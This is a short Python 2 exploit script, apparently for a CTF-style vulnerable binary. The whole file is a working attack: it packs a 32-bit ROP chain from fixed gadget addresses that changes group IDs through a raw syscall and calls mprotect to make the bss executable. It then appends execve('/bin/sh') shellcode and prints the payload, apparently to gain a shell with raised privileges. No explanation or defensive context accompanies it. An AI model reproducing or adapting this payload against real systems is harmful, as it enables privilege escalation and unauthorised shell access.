import subprocess
import struct

def p(a):return struct.pack("<I",a)
def u(a):return struct.unpack("<I",a)[0]


SHELLCODE="\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

ROP = ""

#SETEGID(-1,-1)
ROP += p(0x0805adeb) # popebx,popedx
ROP += p(0xffffffff) # 0xffffffff
ROP += p(0xffffffff) # 0xffffffff
ROP += p(0x080dbc2c) # popecx
ROP += p(0x000003f0) # 0x3f0
ROP += p(0x080beb89) # popeax
ROP += p(0x000000d2) # 0xd2
ROP += p(0x0805b5c0) # int 0x80

#MPROTECT(bss,0x2000,0x07)
ROP += p(0x0805a5a0) # mprotect
ROP += p(0x080489dc) # pppr
ROP += p(0x080e5c60) # bss
ROP += p(0x00002000) # 0x2000
ROP += p(0x00000007) # 0x07
ROP += SHELLCODE

print ROP


